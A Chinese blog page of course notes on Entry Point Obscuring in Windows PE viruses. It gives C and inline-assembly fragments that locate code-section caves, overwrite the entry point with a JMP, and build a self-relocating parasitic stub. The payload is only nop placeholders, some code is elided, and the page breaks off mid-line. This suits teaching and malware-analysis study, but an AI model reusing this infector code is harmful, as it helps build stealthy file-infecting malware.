@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wsw8.online","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="入口点模糊技术Entry Point Obscuring（EPO）：  EPO是病毒代码隐藏自己入口点，避免被查杀的一种技术 EPO使得被病毒修改的入口点看起来依然像是正常的入口点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="病毒_Win_EPO入口点不在代码节的问题">
+<meta property="og:url" content="https://wsw8.online/2021/05/19/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/index.html">
+<meta property="og:site_name" content="江湖">
+<meta property="og:description" content="入口点模糊技术Entry Point Obscuring（EPO）：  EPO是病毒代码隐藏自己入口点，避免被查杀的一种技术 EPO使得被病毒修改的入口点看起来依然像是正常的入口点">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wsw8.online/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519163430182.png">
+<meta property="og:image" content="https://wsw8.online/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519165604094.png">
+<meta property="og:image" content="https://wsw8.online/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519170847754.png">
+<meta property="og:image" content="https://wsw8.online/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519173947160.png">
+<meta property="article:published_time" content="2021-05-19T01:43:26.000Z">
+<meta property="article:modified_time" content="2021-05-19T10:05:02.568Z">
+<meta property="article:author" content="汪道之">
+<meta property="article:tag" content="课程">
+<meta property="article:tag" content="计算机">
+<meta property="article:tag" content="病毒">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wsw8.online/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519163430182.png">
+
+<link rel="canonical" href="https://wsw8.online/2021/05/19/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>病毒_Win_EPO入口点不在代码节的问题 | 江湖</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">江湖</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">有人的地方就有江湖</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wsw8.online/2021/05/19/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="汪道之">
+      <meta itemprop="description" content="有的人身着布衣，却心有锦缎。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="江湖">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          病毒_Win_EPO入口点不在代码节的问题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-19 09:43:26 / 修改时间：18:05:02" itemprop="dateCreated datePublished" datetime="2021-05-19T09:43:26+08:00">2021-05-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%97%85%E6%AF%92/" itemprop="url" rel="index"><span itemprop="name">病毒</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="入口点模糊技术"><a href="#入口点模糊技术" class="headerlink" title="入口点模糊技术"></a>入口点模糊技术</h2><p>Entry Point Obscuring（EPO）：</p>
+<ol>
+<li>EPO是病毒代码隐藏自己入口点，避免被查杀的一种技术</li>
+<li>EPO使得被病毒修改的入口点看起来依然像是正常的入口点</li>
+</ol>
+<span id="more"></span>
+
+<h3 id="解决入口点不在代码段问题"><a href="#解决入口点不在代码段问题" class="headerlink" title="解决入口点不在代码段问题"></a>解决入口点不在代码段问题</h3><ol>
+<li>不感染最后一节，直接感染代码节，病毒代码依附在代码节的尾部，再修改入口点，这样虽然修改了入口点，但是入口点在代码节</li>
+<li>不修改入口点但将入口点所在指令替换成一条JMP指令，跳到寄生的病毒代码</li>
+</ol>
+<h3 id="EPO1-感染在代码节的空洞"><a href="#EPO1-感染在代码节的空洞" class="headerlink" title="EPO1 感染在代码节的空洞"></a>EPO1 感染在代码节的空洞</h3><h4 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519163430182.png" alt="image-20210519163430182"></p>
+<h4 id="和之前的不同"><a href="#和之前的不同" class="headerlink" title="和之前的不同"></a>和之前的不同</h4><blockquote>
+<p>以前是获得最后一个节</p>
+<p>现在是获得第一个代码节</p>
+</blockquote>
+<h4 id="找代码节的方法"><a href="#找代码节的方法" class="headerlink" title="找代码节的方法"></a>找代码节的方法</h4><blockquote>
+<ol>
+<li>遍历所有节表项</li>
+<li>判断节表项的属性里是否有0x00000020属性（代码节）</li>
+</ol>
+</blockquote>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历所有节表项寻找代码节</span></span><br><span class="line"><span class="type">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;</span><br><span class="line">IMAGE_SECTION_HEADER infectedSectionHdr;    <span class="comment">//变量，存节表项</span></span><br><span class="line"><span class="type">bool</span> found = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)&#123;		</span><br><span class="line">  fread(&amp;infectedSectionHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);   <span class="comment">//每次读一个节头</span></span><br><span class="line">  <span class="comment">//通过characteristics字段判断是否为代码节</span></span><br><span class="line">  <span class="keyword">if</span> ((infectedSectionHdr.Characteristics &amp; <span class="number">0x00000020</span>) == <span class="number">0x00000020</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//判断文件中代码节的空洞是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (infectedSectionHdr.SizeOfRawData - infectedSectionHdr.Misc.VirtualSize &lt;CODE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;the code section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   found = <span class="literal">true</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!found)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;cannot find code section\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EPO2-感染最后节，替换入口指令"><a href="#EPO2-感染最后节，替换入口指令" class="headerlink" title="EPO2 感染最后节，替换入口指令"></a>EPO2 感染最后节，替换入口指令</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
+<li>先将原入口5字节保存</li>
+<li>替换成JMP跳到寄生代码</li>
+<li>病毒执行后将入口的5字节还原</li>
+<li>然后跳到原入口</li>
+</ol>
+<h4 id="图示"><a href="#图示" class="headerlink" title="图示"></a>图示</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519165604094.png" alt="image-20210519165604094"></p>
+<h4 id="getCode函数设计"><a href="#getCode函数设计" class="headerlink" title="getCode函数设计"></a>getCode函数设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519170847754.png" alt="image-20210519170847754"></p>
+<p>关于最后的数据区</p>
+<blockquote>
+<p>数据区需要保存被覆盖的5个字节</p>
+<p>需要保存数据区起始地址4个字节</p>
+<p>需要保存原程序入口地址4个字节</p>
+<p>共13字节</p>
+</blockquote>
+<p>函数参数</p>
+<blockquote>
+<ol>
+<li>原入口点RVA——AddressOfEntryPoint</li>
+<li>病毒寄生位置RVA——起始RVA+virtualSize</li>
+<li>原程序预期加载地址——ImageBase</li>
+<li>存被覆盖5个字节的字符数组</li>
+<li>代码</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="type">char</span> * code = (<span class="type">char</span> *)<span class="built_in">malloc</span>(virusSize);   <span class="comment">//为内嵌汇编分配内存</span></span><br><span class="line"><span class="built_in">memcpy</span>(code, (<span class="type">void</span> *)virusStart, virusSize);   <span class="comment">//将内嵌汇编代码拷贝到该内存区域</span></span><br><span class="line"><span class="comment">//由传递的参数计算需要放到寄生病毒数据区的值：预期的病毒数据区内存地址、预期的原入口点</span></span><br><span class="line"><span class="type">long</span> expectedVirusDataAddress = imageBase + virusStartRVA + <span class="number">5</span>; <span class="comment">//5为数据区前面的call指令</span></span><br><span class="line"><span class="type">long</span> oldEntryAddress = imageBase + oldEntryRVA;</span><br><span class="line"><span class="comment">//定位到寄生病毒代码的数据区</span></span><br><span class="line"><span class="type">char</span> * virusData = code + <span class="number">5</span>;</span><br><span class="line">*(<span class="type">long</span> *)(virusData + <span class="number">5</span>) = expectedVirusDataAddress;<span class="comment">//写入数据区的第二个数据</span></span><br><span class="line">*(<span class="type">long</span> *)(virusData + <span class="number">5</span> + <span class="number">4</span>) = oldEntryAddress;<span class="comment">//写入数据区的第三个数据</span></span><br><span class="line"><span class="comment">//写入被覆盖的5个字节（由函数参数oldEntryBytes获得）到数据区的第一个数据</span></span><br><span class="line">*(<span class="type">long</span> *)virusData = *(<span class="type">long</span> *)oldEntryBytes;  <span class="comment">//写入前4个字节</span></span><br><span class="line">*(virusData + <span class="number">4</span>) = *(oldEntryBytes + <span class="number">4</span>);	<span class="comment">//写入第5个字节</span></span><br><span class="line"><span class="comment">//生成最后的JMP指令</span></span><br><span class="line"><span class="type">char</span> * jmpPtr = code + virusSize - <span class="number">5</span>;<span class="comment">//定位到寄生代码中的JMP指令</span></span><br><span class="line">* jmpPtr = <span class="number">0xe9</span>; <span class="comment">//先放JMP指令的机器码</span></span><br><span class="line">jmpPtr++;	<span class="comment">//定位到JMP指令的偏移量部分</span></span><br><span class="line">*(<span class="type">long</span> *)jmpPtr = oldEntryRVA - (virusStartRVA + virusSize); <span class="comment">//写入JMP指令的偏移量</span></span><br><span class="line"><span class="keyword">return</span> code;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>关键问题</p>
+<blockquote>
+<p>ImageBase是程序预期的加载基地址，但是win7和vs编译器往往采用了随机地址空间技术，所以我们需要自定位技术</p>
+</blockquote>
+<p>代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">getCode</span><span class="params">( … )</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> virusStart, virusEnd;</span><br><span class="line">	<span class="type">int</span> virusSize;</span><br><span class="line">	_asm&#123;</span><br><span class="line">	mov virusStart, offset virus_start; <span class="comment">//获取病毒代码起始偏移</span></span><br><span class="line">	mov virusEnd, offset virus_end;   <span class="comment">//获取病毒代码结束偏移</span></span><br><span class="line">	&#125;</span><br><span class="line">	virusSize = virusEnd - virusStart;  <span class="comment">//获取病毒代码长度</span></span><br><span class="line">	<span class="keyword">if</span> (oldEntryBytes == Null)</span><br><span class="line">                      <span class="keyword">return</span> (<span class="type">char</span> *)virusSize;</span><br><span class="line">	</span><br><span class="line">               …..  <span class="comment">//这部分代码处理内嵌汇编无法处理的部分</span></span><br><span class="line"></span><br><span class="line">	virus_start:    <span class="comment">//病毒代码起始标号</span></span><br><span class="line">	   _asm&#123;               <span class="comment">//这段嵌入汇编是需要寄生的病毒代码</span></span><br><span class="line">               		call yy; <span class="comment">//跳过数据区并且把数据区实际地址压栈</span></span><br><span class="line">data:</span><br><span class="line">		<span class="comment">//5字节被覆盖的数据</span></span><br><span class="line">		nop;  </span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		<span class="comment">//预期的数据区地址4字节</span></span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		<span class="comment">//预期的原入口点地址4字节</span></span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line">		nop;</span><br><span class="line"></span><br><span class="line">yy:</span><br><span class="line">		<span class="comment">//pop eax;  //执行后eax寄存器存放了病毒数据区data的实际地址</span></span><br><span class="line">        jmp xx;<span class="comment">//模拟的有效代码</span></span><br><span class="line">		nop;<span class="comment">//病毒行为</span></span><br><span class="line">		nop;</span><br><span class="line">xx:</span><br><span class="line">                              <span class="comment">//push ebx;//恢复被覆盖的5个字节 </span></span><br><span class="line">    pop eax;  <span class="comment">//eax为数据区实际地址</span></span><br><span class="line">	push ebx;       </span><br><span class="line">	push ecx;</span><br><span class="line">	mov ebx, eax;         <span class="comment">//eax用来访问实际数据，ebx存实际地址</span></span><br><span class="line">	sub ebx, [eax + <span class="number">5</span>];    <span class="comment">//ebx得到加载偏差 = 实际地址 – 预期地址</span></span><br><span class="line">	mov ecx, [eax + <span class="number">9</span>];       <span class="comment">//访问数据区得到入口的预期地址</span></span><br><span class="line">	add ecx, ebx;            <span class="comment">//获得入口点实际地址</span></span><br><span class="line">	;恢复<span class="number">5</span>字节被覆盖的代码</span><br><span class="line">	<span class="comment">//恢复入口被覆盖的5个字节内容</span></span><br><span class="line">               <span class="comment">//利用ebx先恢复前4字节</span></span><br><span class="line">	mov ebx, [eax];     <span class="comment">//数据区开始的4个字节放入ebx</span></span><br><span class="line">	mov [ecx], ebx;     <span class="comment">//ecx是原入口的实际地址，完成前4个字节的恢复</span></span><br><span class="line">	<span class="comment">//利用bl再恢复最后一字节</span></span><br><span class="line">	mov bl, [eax + <span class="number">4</span>];    </span><br><span class="line">	mov byte ptr [ecx + <span class="number">4</span>], bl; </span><br><span class="line">	pop ecx</span><br><span class="line">	pop ebx;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//后5字节最后一条JMP指令的代码占位</span></span><br><span class="line">		nop</span><br><span class="line">		nop</span><br><span class="line">		nop</span><br><span class="line">		nop</span><br><span class="line">		nop</span><br><span class="line"></span><br><span class="line">             	   &#125;</span><br><span class="line">	virus_end:    <span class="comment">//病毒代码结束标号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="感染代码设计"><a href="#感染代码设计" class="headerlink" title="感染代码设计"></a>感染代码设计</h3><h4 id="图示-1"><a href="#图示-1" class="headerlink" title="图示"></a>图示</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519173947160.png" alt="image-20210519173947160"></p>
+<p>关键：</p>
+<ol>
+<li>找到入口点所在的节</li>
+<li>将入口点（内存位置）转变为文件位置</li>
+</ol>
+<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> ** args)</span></span><br><span class="line">&#123;</span><br><span class="line">readHdrs(fp);	<span class="comment">//读NT头道ntHdrs</span></span><br><span class="line"><span class="type">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;   <span class="comment">//NT头-文件头-NumberOfSections</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> entry = ntHdrs.OptionalHeader.AddressOfEntryPoint;  <span class="comment">//入口点的值（是RVA）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历节判断入口点在哪个节</span></span><br><span class="line"><span class="comment">//判断条件：当前节的RVA(VirtualAdress)&lt;=入口点&lt;=当前节的RVA+该节的VirtualSize</span></span><br><span class="line">IMAGE_SECTION_HEADER lastSectionHdr, curHdr;  <span class="comment">//两个变量：最后一个节头，当前节头 </span></span><br><span class="line"><span class="type">long</span> entryDiskOffset;        <span class="comment">//入口点在文件偏移</span></span><br><span class="line"><span class="type">int</span> entryOffsetToSectionStart;  <span class="comment">//入口点在节内偏移</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="comment">//查找入口点所在的节，找到就获得入口点的文件偏移</span></span><br><span class="line">    <span class="keyword">if</span> ((entry &gt;= curHdr.VirtualAddress) &amp;&amp; (entry &lt;= curHdr.VirtualAddress +   </span><br><span class="line">                                                                curHdr.Misc.VirtualSize))</span><br><span class="line">    &#123;</span><br><span class="line">      entryOffsetToSectionStart = entry - curHdr.VirtualAddress; <span class="comment">//注意VirtualAddress为节起始RVA</span></span><br><span class="line">      entryDiskOffset = curHdr.PointerToRawData + entryOffsetToSectionStart;<span class="comment">//获得入口点文件偏移</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//循环结束时，curHdr指向最后一个节头</span></span><br><span class="line">lastSectionHdr = curHdr;</span><br><span class="line"><span class="type">int</span> codeSize = (<span class="type">int</span>)getCode(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">//这里调用了getCode函数的第二种功能</span></span><br><span class="line"><span class="comment">//判断最后一个节是否有空洞寄生</span></span><br><span class="line"><span class="keyword">if</span> (lastSectionHdr.SizeOfRawData - lastSectionHdr.Misc.VirtualSize &lt; codeSize)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the last section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时文件指针正好读完最后一个节头，先改最后一个节的VirtualSize字段，减少文件定位操作</span></span><br><span class="line">fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR);</span><br><span class="line">fseek(fp, <span class="number">8</span>, SEEK_CUR);<span class="comment">//VirtualSize字段前有8字节的节名</span></span><br><span class="line"><span class="type">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + codeSize;</span><br><span class="line">fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp);</span><br><span class="line"><span class="comment">//将原入口点的5个字节（即将被覆盖）保存一下</span></span><br><span class="line"><span class="type">char</span> firstCode[<span class="number">5</span>];</span><br><span class="line">fseek(fp, entryDiskOffset, SEEK_SET);  <span class="comment">//定位到入口点的文件位置</span></span><br><span class="line">fread(firstCode, <span class="number">5</span>, <span class="number">1</span>, fp); <span class="comment">//将这5个字节保存到firstCode，后面作为getCode函数的最后一个参数</span></span><br><span class="line"><span class="comment">//在入口点处插入JMP指令，该指令跳到感染的病毒代码处</span></span><br><span class="line"><span class="type">char</span> jmpCode[<span class="number">5</span>];</span><br><span class="line">jmpCode[<span class="number">0</span>] = <span class="number">0xe9</span>;</span><br><span class="line"><span class="comment">//跳转目的地址为：感染代码的位置，即最后一个节的VirtualAddress+VirualSize</span></span><br><span class="line"><span class="comment">//跳转的源地址为：JMP指令后面，即AddressOfEntryPoint + 5 （JMP指令长度）</span></span><br><span class="line">*(<span class="type">long</span> *)(jmpCode + <span class="number">1</span>) = 